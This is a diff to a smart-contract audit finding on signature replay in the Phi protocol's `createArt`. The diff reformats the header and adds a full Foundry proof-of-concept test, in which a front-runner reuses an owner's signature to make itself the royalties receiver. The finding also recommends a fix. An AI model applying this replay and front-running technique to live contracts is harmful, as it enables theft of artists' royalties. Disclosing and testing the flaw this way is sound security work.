@@ -1,12 +1,19 @@
 # H-03 | Signature Replay in `createArt` Allows Impersonation of Artist and Theft of Royalties
 
 **Author:** Hailthelord
-**Protocol: ** Phi
-**Proof Link: ** https://github.com/code-423n4/2024-08-phi-findings/issues/70
+
+**Protocol:** Phi
+
+**Proof Link:** https://github.com/code-423n4/2024-08-phi-findings/issues/70
+
 **Severity:** High  
+
 **Category:** Signature  
+
 **Type:** Signature Replay / Missing Domain Separation  
+
 **Protocol:** Phi Protocol  
+
 **Submitted via:** Code4rena  
 
 ## Summary
@@ -46,15 +53,42 @@ The `createArt()` function in `PhiFactory` accepts a signature that only covers 
 - **Loss of funds for legitimate artists and creators**.
 - High severity because the attack is cheap to execute (just front-running gas) and has permanent economic consequences.
 
-## Proof of Concept
+## Proof of Concept (Full Code)
 
-The warden provided a Foundry test (`testKuprum_ImpersonateArtist`) that demonstrates the full attack:
+Drop this test into `PhiFactory.t.sol` and run with `forge test --match-test testKuprum_ImpersonateArtist`:
 
-- Owner prepares a legitimate signature + config.
-- `user1` front-runs using the same signature but with `receiver = user1`.
-- After both transactions, `phiFactory.artData(artId).receiver == user1`.
+```solidity
+function testKuprum_ImpersonateArtist() public {
+    // The owner prepares the signature, the config,
+    // and submits the `createArt` transaction
+    string memory artIdURL = "sample-art-id";
+    bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
+    bytes memory signCreateData = abi.encode(expiresIn, artIdURL, credData);
+    bytes32 createMsgHash = keccak256(signCreateData);
+    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
+    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
+    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
+    IPhiFactory.CreateConfig memory config =
+        IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
+    
+    // user1 observes `createArt` transaction in the mempool, and frontruns it,
+    // reusing the signature, but with their own config where user1 is the receiver
+    vm.deal(user1, 1 ether);
+    vm.startPrank(user1);
+    IPhiFactory.CreateConfig memory user1Config =
+        IPhiFactory.CreateConfig(artCreator, user1, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
+    phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), user1Config);
 
-The test confirms that the attacker becomes the royalties recipient while the original transaction still succeeds without any visible error to the legitimate user.
+    // Owner's `createArt` succeeds; there is also no difference in the `ArtContractCreated` event
+    vm.startPrank(owner);
+    phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);
+
+    // Verify that user1 is now the royalties recepient
+    uint256 artIdNum = 1;
+    IPhiFactory.ArtData memory updatedArt = phiFactory.artData(artIdNum);
+    assertEq(updatedArt.receiver, user1, "user1 should be the royalties recepient");
+}
+```
 
 ## Recommendation
 
@@ -83,7 +117,3 @@ function createArt(
 
 Additionally, consider using EIP-712 typed data hashing with proper domain separation for better security and readability.
 
----
-
-**Status:** Open  
-**Tags:** `#signature` `#replay` `#front-running` `#royalties` `#high-severity`
